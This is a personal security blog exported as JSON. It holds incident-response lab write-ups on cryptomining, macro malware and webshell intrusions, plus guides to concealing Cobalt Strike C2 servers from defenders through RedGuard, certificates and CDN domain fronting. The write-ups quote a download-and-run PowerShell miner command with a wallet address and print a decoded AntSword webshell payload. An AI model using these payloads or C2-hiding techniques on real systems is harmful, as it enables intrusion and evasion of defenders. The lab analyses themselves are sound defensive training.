{"meta":{"title":"Liusha's Blog","subtitle":"愿此生不换，此生无悔!","description":"珍惜光阴，享受当下!","author":"liushastil","url":"http://dale.us.kg","root":"/"},"pages":[{"title":"categories","date":"2024-10-27T10:49:32.000Z","updated":"2024-10-28T02:05:07.208Z","comments":true,"path":"categories/index.html","permalink":"http://dale.us.kg/categories/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2024-10-27T15:09:15.000Z","updated":"2024-10-27T15:13:29.665Z","comments":true,"path":"link/index.html","permalink":"http://dale.us.kg/link/index.html","excerpt":"","text":""},{"title":"标签","date":"2024-10-27T15:08:46.000Z","updated":"2024-10-27T15:12:25.929Z","comments":true,"path":"tags/index.html","permalink":"http://dale.us.kg/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"RedGuard的使用方法","slug":"RedGuard的使用方法","date":"2024-12-12T14:08:25.000Z","updated":"2024-12-12T14:55:17.362Z","comments":true,"path":"2024/12/12/RedGuard的使用方法/","permalink":"http://dale.us.kg/2024/12/12/RedGuard%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/","excerpt":"","text":"2024-12-12🌱湖州: ☁️ 🌡️+9°C 🌬️←8km&#x2F;h 项目地址https://github.com/wikiZ/RedGuard教程参考地址：https://github.com/wikiZ/RedGuard/blob/main/doc/README_CN.md 下载安装我是直接下载好编译好的版本，然后赋予执行权限 1chmod +x ./RedGuard&amp;&amp;./RedGuard 初次运行会生成配置文件，在如下的目录 /root/.RedGuard_CobaltStrike.ini 工具作用避免Blue Team,AVS,EDR,Cyberspace Search Engine的检查 使用方法使用自定义的证书 首先修改配置文件中的证书信息nano /root/.RedGuard_CobaltStrike.ini 我使用的是clouflare的证书，其他的证书填写对应的信息 拦截转发配置如下图 其中配置表示若80端口的请求的host头是360.net，则转发到本地的8080端口，否则就劫持360.net的响应给客户端；若443端口的请求的host头是360.com，则转发到本地的4433端口，否则就劫持360.net的响应给客户端 其他的示例配置如下 123456#自定义删除http头DelHeader = Keep-Alive,Transfer-Encoding#允许访问时间AllowTime = 8:00 - 21:00# C2 Malleable File PathMalleableFile = /root/cobaltstrike/Malleable.profile coboltstrike上线 http的监听器的格式如下 HTTP Hosts填写自己的vps的ip地址HTTP Host(Stager)也是填写自己的vps的ip地址HTTP Port(C2)就是上线的地址，这里是80HTTP Port(Bind)是监听的地址，因为RedGuard会将流量转发到8080端口HTTP Host Header填写RedGuard配置文件中定义的host的地址 然后443端口也是类似的配置 生成payload执行即可上线，并且可以执行命令，配置成功 配置IPtables，只允许127.0.0.1访问本机的监听端口 1234iptables -I INPUT -p tcp --dport 8080 -j DROPiptables -I INPUT -p tcp -s 127.0.0.1 --dport 8080 -j ACCEPTiptables -I INPUT -p tcp --dport 4433 -j DROPiptables -I INPUT -p tcp -s 127.0.0.1 --dport 4433 -j ACCEPT 经过测试，无法直接访问8080和4433端口，能够上线并且执行命令","categories":[{"name":"工具","slug":"工具","permalink":"http://dale.us.kg/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"c2隐藏","slug":"c2隐藏","permalink":"http://dale.us.kg/tags/c2%E9%9A%90%E8%97%8F/"}]},{"title":"cobaltstrike隐藏","slug":"cobaltstrike隐藏","date":"2024-11-13T04:31:13.000Z","updated":"2024-12-12T15:18:42.781Z","comments":true,"path":"2024/11/13/cobaltstrike隐藏/","permalink":"http://dale.us.kg/2024/11/13/cobaltstrike%E9%9A%90%E8%97%8F/","excerpt":"","text":"2024-11-13🌱湖州: ⛅️ 🌡️+20°C 🌬️↖19km&#x2F;h 修改证书参考链接：https://blog.csdn.net/weixin_42282667/article/details/123356104 下载配置cloudflare的证书 访问如下网站https://dash.cloudflare.com/ 选择自己的域名，然后点击配置 将加密方式修改成full 创建证书 创建一个新的证书 点击创建 将生成的证书和私钥储存好 生成store格式的证书对 将上面保存的证书储存到cloudflare.pem文件中 将私钥保存到cloudflare.key中 生成keystore文件 使用openssl将pem证书和key私钥导出为P12格式的证书 123openssl pkcs12 -export -in pem证书 -inkey key私钥 -out p12文件 -name 域名 -passout pass:密码openssl pkcs12 -export -in cloudflare.pem -inkey cloudflare.key -out cloudflare.p12 -name your-domain -passout pass:csissohard 使用keytool生成store格式的证书对1234keytool -importkeystore -deststorepass pass -destkeypass pass -destkeystore store文件 -srckeystore P12格式证书 -srcstoretype PKCS12 -srcstorepass pass -alias 域名keytool -importkeystore -deststorepass csissohard -destkeypass csissohard -destkeystore clouflare.store -srckeystore cloudflare.p12 -srcstoretype PKCS12 -srcstorepass csissohard -alias your-domain 生成成功，查看store文件的信息12keytool -list -v -keystore clouflare.store# 要求输入的密码就是自己设置的 cs证书配置cs启动时会加载一个默认的配置文件，里面配置了证书文件、证书密码、心跳时间等等。配置文件中还可以修改特定的请求和响应让cs的通信在流量中看起来更像合法的请求。 要在teamserver使用另外的keystore证书文件，还需要重新写个配置文件(profile)引用证书。CS profile文件地址：https://github.com/rsmudge/Malleable-C2-Profiles/https Beacon的证书配置如下： 12345https-certificate &#123; set keystore &quot;store证书&quot;； set password &quot;密码&quot;；&#125; 因为我是cs4.9，所以直接下载上面网站的对应的版本的文件即可 修改完成后，可以用自带的c2lint检查配置文件是否正确，只要不报错就可以正常使用 1./c2lint 1.profile 我的c2lint出问题了，一直报错 修改teamserver的证书 证书名称和密码修改一下即可 使用cloudflare的cdn隐藏c2的ip(已失效)使用cloudflare绑定域名，并且解析A我们的vps的IP 点击对应的域名，然后找到caching中的configuration，打开开发模式 打开页面规则，添加如下的规则 在pofile中的如下位置添加如下的headerheader &quot;Content-Type&quot; &quot;application/*; charset=utf-8&quot;在pofile中的如下位置添加如下的header，这个设置可以获得上线主机的真实IPset trust_x_forwarded_for &quot;true&quot;; 经过测试这种方法已经失效，我能成功上线，但是一会就会掉线，而且一直无法执行命令，不知道是否是我的操作有误，欢迎交流学习 使用nginx和Certbot隐藏下载nginx和Cerbot12apt install nginx -yapt install certbot python3-certbot-nginx -y 配置nginxNginx 配置文件通常在 /etc/nginx/sites-available/default 12345678910111213server &#123; listen 80; server_name teamserver.example.com; location / &#123; proxy_pass http://localhost:7000; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; &#125;&#125; 一般是会新建一个配置文件/etc/nginx/sites-available/your-domain.conf 1234567891011121314151617181920212223242526272829303132server &#123; # 接收 HTTP 流量并重定向到 HTTPS listen 80; server_name your-domain; return 301 https://$host$request_uri;&#125;server &#123; # 接收 HTTPS 流量 listen 443 ssl; server_name your-domain; # SSL 证书配置 ssl_certificate /etc/letsencrypt/live/yourdomain.com/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem; # 强制使用现代加密协议 ssl_protocols TLSv1.2 TLSv1.3; ssl_ciphers HIGH:!aNULL:!MD5; # 配置cs服务端连接端口 location /7000/ &#123; proxy_pass http://localhost:7000/; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; &#125; &#125; 创建符号链接以启用配置 12sudo ln -s /etc/nginx/sites-available/your-domain.conf /etc/nginx/sites-enabled/ 申请证书 使用 Certbot 为域名生成证书 12certbot certonly --standalone -d teamserver.example.comsudo certbot --nginx -d teamserver.example.com 自动续期证书： Certbot 会自动设置续期任务，检查是否运行 1sudo systemctl list-timers | grep certbot 重启nginx1sudo systemctl restart nginx 感觉这种方法配置太麻烦了，而且只设置了一个反代，作用好像不是很大，弃用弃用！！！ 使用RedGuard隐藏C2(推荐)项目地址https://github.com/wikiZ/RedGuard/blob/main/doc/README_CN.md 我是直接下载好编译好的版本，然后赋予执行权限 1chmod +x ./RedGuard&amp;&amp;./RedGuard 这个项目相当于是一个有着防火墙功能的nginx，它默认将80端口转发到本地的8080端口，将443端口转达到本地的4433端口 随机生成了一个证书，可以修改成自己的证书，我是用的是cloudflare的证书，将它的格式改成ca.key和ca.cert的格式即可 起到了一定的隐藏作用，防止我们的vps被标记和攻击，还是非常有作用的 其他的参考我的文章：RedGuard的使用方法 域前置技术参考： https://cloud.tencent.com/developer/article/1785562 https://blog.csdn.net/q20010619/article/details/122001830 前提：配置好了dns解析，并且将域名托管到cloudflare，这里使用免费的计划 使用cloudflare的话访问我们的域名就会先转到cloudflare的cdn，通过cdn交流 然而我们可能和一个高信誉的域名使用同一个cdn的ip，它使用http头的host来判断是哪一个域名需要加速 首先超级ping我们的域名，收集解析的cdn的ip 反查cdn的ip的网站，就能找到和我们使用同一个ip加速的网站，找一个信誉度高的 测试方法1234567891011121314104.21.72.159 tset.com172.67.152.185124.236.16.201显示我们网站的内容curl 34.107.221.82 -H &quot;Host: you-domain&quot; -v显示高信誉的网站的内容curl 34.107.221.82 -H &quot;Host: test.com&quot; -v显示高信誉的网站的内容curl you-domain -H &quot;Host: test.com&quot; -v 然后cobaltstrike配置监听器的时候将所有的cdn的ip地址都添加到HTTP Hosts 将HTTP Host(Stager)填高信誉的域名xjzhw.com 然后填写好上线的端口HTTP Port(C2) 监听端口不填的话就是上线的端口HTTP Port(Bind) host Header填自己的域名地址 修改profile文件中所有get和post请求的host为自己的域名 然后注意各个cdn厂商支持的端口，cloudflare的htp协议默认是支持80、8080、2095等，https协议默认支持443、2096等 2024-12-12 但是经过我的实验，cloudflare现在好像是做了限制，不能直接使用这个cdn来隐藏c2的流量了，主机能够上线，但是一会儿就断线了，命令也执行不了 其他的厂商的cdn没有测试过，以后有机会再尝试下","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://dale.us.kg/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"cobaltstrike","slug":"cobaltstrike","permalink":"http://dale.us.kg/tags/cobaltstrike/"}]},{"title":"应急响应靶机-挖矿","slug":"应急响应靶机-挖矿","date":"2024-11-08T10:09:58.000Z","updated":"2024-11-09T10:19:19.507Z","comments":true,"path":"2024/11/08/应急响应靶机-挖矿/","permalink":"http://dale.us.kg/2024/11/08/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA-%E6%8C%96%E7%9F%BF/","excerpt":"","text":"2024-11-08🌱湖州: ☁️ 🌡️+17°C 🌬️↓5km&#x2F;h 靶场来源https://agonysec.github.io/post/emergency-response-target-machine-trainingmining-fgqqu.html 挑战题解： 攻击者的IP地址 攻击者开始攻击的时间 攻击者攻击的端口 挖矿程序的md5 后门脚本的md5 矿池地址 钱包地址 攻击者是如何攻击进入的 相关账户密码： Administrator&#x2F;zgsf@123 查看最近的文件 win+r输入recent 发现这个AppDate目录和这个systems.bat.txt比较可疑 打开AppData目录 发现bat文件 查看systems.bat文件 1powershell -Command &quot;$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += &#x27;.bat&#x27;; $wc.DownloadFile(&#x27;https://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.bat&#x27;, $tempfile); &amp; $tempfile 4APXVhukGNiR5kqqVC7jwiVaa5jDxUgPohEtAyuRS1uyeL6K1LkkBy9SKx5W1M7gYyNneusud6A8hKjJCtVbeoFARuQTu4Y; Remove-Item -Force $tempfile&quot; 是一个挖矿的脚本 c3pool.org是一个著名的挖矿服务平台，上面的命令表示下载并运行这个bat脚本，后面的一串编码就是攻击者的钱包地址，mine.c3pool.com就是它的矿池 钱包地址：4APXVhukGNiR5kqqVC7jwiVaa5jDxUgPohEtAyuRS1uyeL6K1LkkBy9SKx5W1M7gYyNneusud6A8hKjJCtVbeoFARuQTu4Y 矿池顶级域名：c3pool.com 计算systems.bat的md5值1certutil -hashfile systems.bat MD5 后门脚本的md5：8414900f4c896964497c2cf6552ec4b9 查找挖矿程序 ctrl+shift+esc打开任务管理器 发现XMRig miner程序占用内存过高，估计就是挖矿程序 计算挖矿程序MD5值1certutil -hashfile xmrig.exe MD5 挖矿程序MD5值：a79d49f425f95e70ddf0c68c18abc564 查看recent的时候发现有账号密码的文件，一看发现密码都是一样的 估计攻击者是通过拿下WebServer，然后通过密码喷洒获取了本机的权限 攻击端口：3389 查看日志 使用logparser查看登录失败的日志 攻击时间：2024-05-21 20:25:22攻击者IP：192.168.115.131 总结挖矿的程序一般会占用大量的内存，还是比较好找的","categories":[{"name":"应急响应","slug":"应急响应","permalink":"http://dale.us.kg/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[]},{"title":"应急响应靶机-近源渗透OS1","slug":"应急响应靶机-近源渗透OS1","date":"2024-11-01T15:00:58.000Z","updated":"2024-11-09T10:19:19.555Z","comments":true,"path":"2024/11/01/应急响应靶机-近源渗透OS1/","permalink":"http://dale.us.kg/2024/11/01/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA-%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8FOS1/","excerpt":"","text":"2024-11-01🌱湖州: ☁️ 🌡️+17°C 🌬️↘27km&#x2F;h 靶机来源https://mp.weixin.qq.com/s/bVlctiSGmRkmRBaUVibwUg 前景需要：小王从某安全大厂被优化掉后，来到了某私立小学当起了计算机老师。某一天上课的时候，发现鼠标在自己动弹，又发现除了某台电脑，其他电脑连不上网络。感觉肯定有学生捣乱，于是开启了应急。 1.攻击者的外网IP地址 2.攻击者的内网跳板IP地址 3.攻击者使用的限速软件的md5大写 4.攻击者的后门md5大写 5.攻击者留下的flag 相关账户密码 Administrator zgsf@2024 查看最近的文件 win+r输入recent 操作前建议先拍一个快照,方便恢复初始环境这里虚拟机没有安装vmtools,所以使用远程桌面登录方便点 可以看到有几个word文档和excel表格被访问,这个就很可疑 将所有的文件放到微步云沙箱分析,发现学校放假通知-练习.doc存在宏病毒 获得攻击者的外网IP地址:8.219.200.130 上面的.icons、a.txt、a.vbs、test.txt都无法访问了，估计是改过名称了 然后查看最近访问的目录link 虽然文件夹是空的，但是显示包含一个文件 取消选择隐藏 发现了一个bat文件 查看文件内容 发现是powershell命令 发现攻击者的内网跳板IP地址：192.168.20.129 查找限速软件 使用系统自带的搜索文件功能搜索日期为2024&#x2F;5&#x2F;6修改的文件 因为最近的文件都是2024&#x2F;5&#x2F;6的 找到了可疑的目录，查找到了可能的限速软件:p2pover4.34.exe 网上搜索了一下，果然是名为p2p终结者的限速软件 计算限速软件md5值：2a5d8838bdb4d404ec632318c94adc96 certutil -hashfile p2pover4.34.exe MD5 查找后门 查找2024&#x2F;5&#x2F;6的修改的文件 发现了一个python编译的sethc.exe文件，很可疑 很明显这就是后门了 运行发现攻击者留下的flag:flag{zgsf@shift666} 反编译查看源代码 这是一个shift粘滞键后门 若是还有其他后门没有发现，可以从攻击者的视角出发查找 参考链接: https://xz.aliyun.com/t/9718?time__1311=n4%2BxnD0DuDRDBAWDkCD%2Fia4BKPxxfhxY5IN62Qx","categories":[{"name":"应急响应","slug":"应急响应","permalink":"http://dale.us.kg/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"应急响应/windows/实战","slug":"应急响应-windows-实战","permalink":"http://dale.us.kg/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows-%E5%AE%9E%E6%88%98/"}]},{"title":"应急响应靶机-Web2","slug":"应急响应靶机-Web2","date":"2024-10-31T01:20:21.000Z","updated":"2024-11-09T10:19:19.470Z","comments":true,"path":"2024/10/31/应急响应靶机-Web2/","permalink":"http://dale.us.kg/2024/10/31/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA-Web2/","excerpt":"","text":"2024-10-31🌱湖州: 🌦 🌡️+18°C 🌬️↙14km&#x2F;h 靶场来源https://mp.weixin.qq.com/s?__biz=MzkxMTUwOTY1MA==&amp;mid=2247485230&amp;idx=1&amp;sn=7a6ff6376caf2a2268a468e78901b6d0&amp;chksm=c11a56d3f66ddfc505fa9faf68077bb4679e31919b8cfefe505e8a93a0bcd086f44904e7530f&amp;scene=178&amp;cur_album_id=3245764910756954116#rd 挑战内容 前景需要：小李在某单位驻场值守，深夜12点，甲方已经回家了，小李刚偷偷摸鱼后，发现安全设备有告警，于是立刻停掉了机器开始排查。 这是他的服务器系统，请你找出以下内容，并作为通关条件： 1.攻击者的IP地址（两个）？ 2.攻击者的webshell文件名？ 3.攻击者的webshell密码？ 4.攻击者的伪QQ号？ 5.攻击者的伪服务器IP地址？ 6.攻击者的服务器端口？ 7.攻击者是如何入侵的（选择题）？ 8.攻击者的隐藏用户名？ 相关账户密码 用户:administrator 密码:&#x5a;&#103;&#115;&#102;&#64;&#113;&#113;&#46;&#99;&#x6f;&#109; 查看最近使用的文件win+r输入recent就能查看所有的最近使用过的文件了，然后点击时间排序 可以发现Tencent Files文件夹，里面存在一个数字的文件夹就是QQ号码，可能是通关条件需要的QQ号QQ号码：777888999321但是这个可能是攻击者的QQ吗，为啥会在目标机上有这个呢 查看frp文件夹发现竟然在QQ接收的文件中，原来QQ是这么用的发现了frp配置文件中有伪服务端的IP：256.256.66.88，端口：65536 寻找web相关的系统又是使用小皮搭建的网站，打开网站的根目录发现了一个3389.bat的可疑文件 查看3389.bat文件 发现内容果然是打开3389端口 查看端口开发情况 netstat -an3389端口果然被开启 直接查看web服务器日志 apache中有日志记录，发现如下一直请求system.php文件，这文件肯定有问题，查看根目录下的system.php文件果然发现就是木马文件 webshell文件名：system.phpwebshell密码：hack6618攻击者IP地址1：192.168.126.135 根据之前的日志可以得知，攻击者并没有登录后台。但是却成功上传了webshell文件 查看网站内容使用小皮打开网址，发现是wordpress搭建的网站，密码也不知道解不出来 查看ftp日志小皮中还有一个ftp服务日志没有查看，查看日志文件发现上传了system.php 查看隐藏账户 win+r输入lusrmgr.msc发现隐藏账户：hack887$ 查看日志文件 使用Logparser查看登陆失败日志1LogParser.exe -i:EVT -o:DATAGRID &quot;SELECT TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as username,EXTRACT_TOKEN(Strings, 8, &#x27;|&#x27;) as LogonType,EXTRACT_TOKEN(Strings, 17, &#x27;|&#x27;) AS ProcessName,EXTRACT_TOKEN(Strings, 18, &#x27;|&#x27;) AS SourceIP FROM Security where EventID=4624 AND TO_DATE(TimeGenerated) between timestamp(&#x27;2021-03-01&#x27;, &#x27;yyyy-MM-dd&#x27;) and timestamp(&#x27;2024-10-27&#x27;, &#x27;yyyy-MM-dd&#x27;)&quot; -rtp:-1 发现隐藏用户登陆失败的尝试，IP地址2是：192.168.126.129 整理攻击流程 通过ftp上传webshell文件获取webshell 通过webshell修改注册表开启3389端口 通过webshell新建用户 远程登陆通过qq上传frp，然后进行内网穿透 总结 记得先查看最近使用的文件 win+r 输入recent FTP日志也需要记得查看 查看端口开放情况，是否开启了不需要开启的端口","categories":[{"name":"应急响应","slug":"应急响应","permalink":"http://dale.us.kg/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"应急响应/windows/实战","slug":"应急响应-windows-实战","permalink":"http://dale.us.kg/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows-%E5%AE%9E%E6%88%98/"}]},{"title":"应急响应靶机-Linux(2)-实战","slug":"应急响应靶机-Linux(2)-实战","date":"2024-10-30T08:15:27.000Z","updated":"2024-11-09T10:19:19.392Z","comments":true,"path":"2024/10/30/应急响应靶机-Linux(2)-实战/","permalink":"http://dale.us.kg/2024/10/30/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA-Linux(2)-%E5%AE%9E%E6%88%98/","excerpt":"","text":"2024-10-30🌱湖州: ⛅️ 🌡️+18°C 🌬️↓4km&#x2F;h 靶机来源https://mp.weixin.qq.com/s?__biz=MzkxMTUwOTY1MA==&amp;mid=2247485625&amp;idx=1&amp;sn=ec58f917314da2fee442a94bce81ce9d&amp;chksm=c11a5944f66dd0526a43531f5afdaec58e39dea79df0fbcf413269cb9d5ce54fb1fd1077176a&amp;scene=178&amp;cur_album_id=3245764910756954116&amp;poc_token=HFzoIWej8_HsucBEYhi_jxzHUMoo7djIMJJQd06_ 挑战内容 前景需要：看监控的时候发现webshell告警，领导让你上机检查你可以救救安服仔吗！！ 1,提交攻击者IP 2,提交攻击者修改的管理员密码(明文) 3,提交第一次Webshell的连接URL(http://xxx.xxx.xxx.xx/abcdefg?abcdefg只需要提交abcdefg?abcdefg) 3,提交Webshell连接密码 4,提交数据包的flag1 5,提交攻击者使用的后续上传的木马文件名称 6,提交攻击者隐藏的flag2 7,提交攻击者隐藏的flag3 相关账户密码： root&#x2F;Inch@957821. 基础信息收集 查看历史命令 history发现flag3：flag{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ} 因为靶机打开只有一个终端，而且也没有下vmtools，使用起来不太方便，所以下面使用xshell连接了之前的命令还创建了.api文件夹，并且将当前所在的所有文件复制到该文件夹中 在alinotify.php文件中发现了flag2：flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9} 查看登录信息last 找到了一个可疑IP：192.168.20.1 查看所有用户 1cat /etc/passwd 并没有发现新建的可疑用户 系统安装包检查这次检查直接从这里开始，可以提高效率，减少需要检查的文件 1rpm -V -a 比较可疑的文件修改&#x2F;root&#x2F;.bashrc 没有发现可疑的地方 寻找webshell将网站的目录上传到本地，然后使用D盾扫描，然而没有扫描出来 查看web日志找到web日志路径：&#x2F;www&#x2F;wwwlogs 首先查看错误日志：127.0.0.1.error.logcat 127.0.0.1.error.log发现了许多的爆破目录的错误请求，并且发现第二个可疑IP：192.168.20.131 查看连接日志cat access.log 登录宝塔查看日志修改&#x2F;www&#x2F;server&#x2F;panel&#x2F;vhost&#x2F;nginx&#x2F;127.0.0.1.conf配置文件中的地址为自己的虚拟机的地址命令行输入bt然后选择5，修改面版密码，选择28，修改面板安全入口然后选择1，重启面板服务 用户名: uysycv5w新密码: 123456 然后使用如下地址访问宝塔面板 http://192.168.74.135:12485/qwerty 宝塔面板防护很强，没有什么问题，应该就是下面的网站存在问题登陆成功后，打开数据库查看 发现了用户名和密码的表格 第一个用户的密码可以解密 然后使用上面的账号登录查看 分析流量包还有一个流量包没有分析，将流量包下载到本地进行分析，然后追踪http流，发现了很多index.php?user-app-register这个路由 由这个流量可以得知，webshell的密码是Network2020将之进行URL解密后美化一下代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162Network2020 = @ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$opdir = @ini_get(&quot;open_basedir&quot;);if ($opdir) &#123; $ocwd = dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); $oparr = preg_split(base64_decode(&quot;Lzt8Oi8=&quot;), $opdir);@ array_push($oparr, $ocwd, sys_get_temp_dir()); foreach($oparr as $item) &#123; if (!@is_writable($item)) &#123; continue; &#125;; $tmdir = $item. &quot;/.24b0d&quot;;@ mkdir($tmdir); if (!@file_exists($tmdir)) &#123; continue; &#125; $tmdir = realpath($tmdir);@ chdir($tmdir);@ ini_set(&quot;open_basedir&quot;, &quot;..&quot;); $cntarr = @preg_split(&quot;/\\\\\\\\|\\//&quot;, $tmdir); for ($i = 0; $i &lt; sizeof($cntarr); $i++) &#123;@ chdir(&quot;..&quot;); &#125;;@ ini_set(&quot;open_basedir&quot;, &quot;/&quot;);@ rmdir($tmdir); break; &#125;;&#125;;;function asenc($out) &#123; return $out;&#125;;function asoutput() &#123; $output = ob_get_contents(); ob_end_clean(); echo &quot;02e&quot;. &quot;9bd&quot;; echo@ asenc($output); echo &quot;6f2&quot;. &quot;72a8&quot;;&#125;ob_start();try &#123; $D = base64_decode(substr($_POST[&quot;x0b6b31b98f31d&quot;], 2)); $F = @opendir($D); if ($F == NULL) &#123; echo(&quot;ERROR:// Path Not Found Or No Permission!&quot;); &#125; else &#123; $M = NULL; $L = NULL; while ($N = @readdir($F)) &#123; $P = $D.$N; $T = @date(&quot;Y-m-d H:i:s&quot;, @filemtime($P));@ $E = substr(base_convert(@fileperms($P), 10, 8), -4); $R = &quot; &quot;.$T. &quot; &quot;.@filesize($P). &quot; &quot;.$E. &quot; &quot;;if(@is_dir($P))$M.=$N.&quot; / &quot;.$R;else $L.=$N.$R;&#125;echo $M.$L;@closedir($F);&#125;;&#125;catch(Exception $e)&#123;echo &quot; ERROR: //&quot;.$e-&gt;getMessage();&#125;;asoutput();die();&amp;x0b6b31b98f31d=TtL3d3dy93d3dyb290LzEyNy4wLjAuMS8= 以上的代码很明显是蚁剑的流量，最后的字符串去掉两位base64解密出来是路径 继续查看流量包发现了flag1：flag1{Network@_2020_Hack} 继续往下翻，发现后面全是&#x2F;version2.php的路由，这应该就是后续上传的木马文件名称 这是一个蚂剑木马的流量，它的连接时Kepp-Alive的 总结经过这一次的靶机练习，我发现我还是有很多的不足，比如蚁剑和冰蝎的流量并不是很熟悉，宝塔面板的操作也不熟悉，以后有时间再加强一下吧","categories":[{"name":"应急响应","slug":"应急响应","permalink":"http://dale.us.kg/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"应急响应/Linux/实战","slug":"应急响应-Linux-实战","permalink":"http://dale.us.kg/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux-%E5%AE%9E%E6%88%98/"}]},{"title":"应急响应靶机-Web1实战","slug":"应急响应靶机-Web1实战","date":"2024-10-28T12:23:15.000Z","updated":"2024-11-09T10:19:19.430Z","comments":true,"path":"2024/10/28/应急响应靶机-Web1实战/","permalink":"http://dale.us.kg/2024/10/28/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA-Web1%E5%AE%9E%E6%88%98/","excerpt":"","text":"2024-10-28🌱湖州: ☀️ 🌡️+16°C 🌬️↓9km&#x2F;h 靶场来源https://mp.weixin.qq.com/s?__biz=MzkxMTUwOTY1MA==&amp;mid=2247485154&amp;idx=1&amp;sn=2b27ca8af88ec5107138f3498e48f12a&amp;chksm=c11a571ff66dde09e927da278fc8ac280d0f4a1a046e28eec41da72fc32df678af27f8fef01e&amp;scene=178&amp;cur_album_id=3245764910756954116#rd 用户:administrator 密码:&#x5a;&#x67;&#115;&#102;&#x40;&#97;&#100;&#109;&#105;&#110;&#x2e;&#x63;&#x6f;&#109; 前景需要： 小李在值守的过程中，发现有CPU占用飙升，出于胆子小，就立刻将服务器关机，并找来正在吃苕皮的hxd帮他分析，这是他的服务器系统，请你找出以下内容，并作为通关条件： 1.攻击者的shell密码 2.攻击者的IP地址 3.攻击者的隐藏账户名称 4.攻击者挖矿程序的矿池域名(仅域名) 5.有实力的可以尝试着修复漏洞 寻找漏洞入口点根据前景提示可知，CPU占用飙升，大概率是有挖矿程序，说明攻击者已经获得了服务器的权限，打开虚拟机可以看到有一个小皮面版，大概率是上传了webshell，判断webshell很可能就是攻击者的入口点 使用D盾查找webshell 查看服务器的日志确定了webshell是黑客的入口点后，很明显的看出这个是冰蝎的木马，shell的密码是rebeyond 查看web服务器日志查找黑客的IP地址，以及查看是怎么上传上来的 这里查看本地的web服务器有ngnix和apache两个，发现只有apache中有日志记录 打开access.log.1708905600文件 全局搜索shell.php 从第一条shell.php记录开始寻找，发现了一个上传文件的操作，非常可疑，估计这里存在文件上传漏洞发现连接的IP都是：192.168.126.1 寻找漏洞入口点打开服务，复现文件上传漏洞 web网站存在公开漏洞，漏洞poc如下链接https://github.com/Sec-Fork/POC-20240918/blob/main/Emlog/emlog%E5%90%8E%E5%8F%B0%E6%8F%92%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2024-33752).md 随便在网上找到一个插件，然后添加shell1.php文件，将所有的文件放到shell1文件夹中，然后压缩成压缩包 然后访问如下地址就可以看到上传的文件了&#x2F;content&#x2F;plugins&#x2F;shell1&#x2F;shell1.php 寻找隐藏用户结合前景得知攻击者新建了一个新的隐藏账户，普通查询没法查到隐藏的用户，需要从控制面板的用户管理或者注册表中才能看到 打开控制面板，打开用户账户，打开管理其他用户就能看到有一个隐藏账户 或者打开 cmd 窗口，输入lusrmgr.msc命令，查看是否有新增&#x2F;可疑的账号 发现隐藏用户：hack168$ 寻找挖矿程序怎么寻找挖矿程序呢？攻击者若是想要持续运行挖矿程序的话就需要使用计划任务或者是启动项来加载恶意程序 检查启动项、计划任务、服务单击开始菜单 &gt;【运行】，输入 msconfig，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。 打开cmd，输入schtasks，默认展示所有的计划任务。 WIN +R，输入services.msc，打开服务工具，单击启动类型排序，重点查看启动类型为【自动】的服务 没有找到可疑的地方 查找病毒文件使用卡巴斯基全盘扫描，也没有发现病毒 没法子，随便翻了翻在隐藏用户的桌面目录下发现了kuang.exe文件，运行后直接cpu爆满重启，估计就是那个挖矿病毒了 一看知道是一个python编译的exe文件，反编译还原代码 发现了矿池域名：wakuang.zhigongshanfang.top 总结Windows常见的入侵排查思路： 查找新建用户 分析日志，查找可疑的登陆时间，查找登录失败记录 查看启动项、定时任务、启动服务 